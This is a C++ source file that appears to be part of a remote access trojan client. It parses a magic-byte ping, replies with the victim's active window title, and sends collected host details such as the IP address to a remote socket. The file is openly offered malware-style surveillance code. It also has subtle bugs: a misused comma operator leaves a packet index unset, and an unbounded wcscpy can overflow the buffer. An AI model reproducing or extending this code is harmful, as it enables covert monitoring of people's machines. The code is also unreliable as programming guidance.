//
// Created by LUNAFE on 2022-02-04.
//

#include "packet.h"

int packet::ParsePacket(struct PACKET *packet) {
    if (packet->type == PACKET_TYPE::PING && packet->data[0] == 1 && packet->data[1] == 2 && packet->data[2] == 3 && packet->data[3] == 4) {
#ifdef DEBUG
        printf("[DEBUG] GET_PING\n");
#endif
        return 1;
    } else {
        return 0;
    }

}

void packet::MakePong(struct PACKET *packet_) {
    struct PACKET packet;
    packet.type = PACKET_TYPE::PING;
    util::GenId(packet.task_id, 16);
    wchar_t window_title[128];
    event_handler::GetActiveWindow(window_title);
    wcscpy(packet.data, window_title);
    packet.current_index, packet.final_index = 0;

    memmove(packet_, &packet, sizeof(packet));
}

void packet::Init(struct PACKET *packet) {
#ifdef DEBUG
    printf("[DEBUG] INIT\n");
#endif
    struct INFO init_info;
    util::InitRetrieveInfo(&init_info);

    struct PACKET init_packet;
    init_packet.type = PACKET_TYPE::INFO;
    util::GenId(init_packet.task_id, 16);
    memmove(&(init_packet.data[0]), (wchar_t *) &init_info.ip_address[0], sizeof(init_info));
    init_packet.current_index = 1;
    init_packet.final_index = 1;

    memmove(packet, &init_packet, sizeof(init_packet));
}

void packet::SendInfo() {
    struct PACKET init_packet;
    Init(&init_packet);
    send(main::sock, (char *) &init_packet, PACKET_SIZE, 0);
#ifdef DEBUG
    printf("[DEBUG] INIT_PACKET_SENT\nTASK_ID: %s\n", init_packet.task_id);
#endif
}
